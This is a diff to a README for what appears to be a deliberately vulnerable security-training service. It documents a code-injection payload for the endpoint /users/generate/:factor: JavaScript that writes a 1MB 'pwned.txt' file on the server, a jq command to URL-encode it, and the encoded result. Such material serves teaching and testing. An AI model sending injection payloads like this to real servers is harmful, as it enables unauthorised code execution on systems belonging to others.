@@ -70,19 +70,41 @@ $ yarn run test:cov
 
 ## Example of a malicious payload
 
+### URL for the API call
+
 GET : {{BaseURL}}:{{Port}}/users/generate/:factor
-where factor is:
 
- ```bash
-var%20fs%3Drequire%28%22fs%22%29%2Cstream%3Dfs.createWriteStream%28%22pwned.txt%22%2C%7Bflags%3A%22w%22%7D%29%3Bconst%20megabyte%3D%221000000%22%2CoutputStr%3D%22yougotpwned%22%3Bfor%28var%20i%3D0%3Bi%3Cmegabyte%2FoutputStr.length%3Bi%2B%2B%29%20%7Bstream.write%28%22yougotpwned%22%29%3B%7Dstream.end%28%29%3B
- ```
+### Malicious JavaScript code
 
-This malicious payload will create a file named pwned.txt in the root directory of the server.
-Corresponds to this JavaScript code:
+This malicious payload will create a file named pwned.txt in the root directory of the server with the size of 1MB.
 
 ```bash
-var fs=require("fs"),stream=fs.createWriteStream("pwned.txt",{flags:"w"});const megabyte="1000000",outputStr="yougotpwned";for(var i=0;i<megabyte/outputStr.length;i++) {stream.write("yougotpwned");}stream.end();
+var fs = require("fs")
+
+stream = fs.createWriteStream("pwned.txt", { flags: "w" }); 
+
+const megabyte = "1000000", outputStr = "yougotpwned"; 
+for (var i = 0; i < megabyte / outputStr.length; i++) { 
+    stream.write("yougotpwned"); 
+} 
+stream.end();
 ```
+
+### Encoded malicious JavaScript code
+
+You can encode the malicious JavaScript code with this command (you need to have jq installed):
+
+```bash
+printf %s 'var fs=require("fs"),stream=fs.createWriteStream("pwned.txt",{flags:"w"});const megabyte="1000000",outputStr="yougotpwned";for(var i=0;i<megabyte/outputStr.length;i++) {stream.write("yougotpwned");}stream.end();'|jq -sRr @uri
+```
+
+The output will be:
+```bash
+var%20fs%3Drequire(%22fs%22)%2Cstream%3Dfs.createWriteStream(%22pwned.txt%22%2C%7Bflags%3A%22w%22%7D)%3Bconst%20megabyte%3D%221000000%22%2CoutputStr%3D%22yougotpwned%22%3Bfor(var%20i%3D0%3Bi%3Cmegabyte%2FoutputStr.length%3Bi%2B%2B)%20%7Bstream.write(%22yougotpwned%22)%3B%7Dstream.end()%3B
+```
+
+This malicious payload will create a file named pwned.txt in the root directory of the server.
+
 
 [codecov]: https://codecov.io/gh/MAD-Goat-Project/mad-scoreboard-service
 
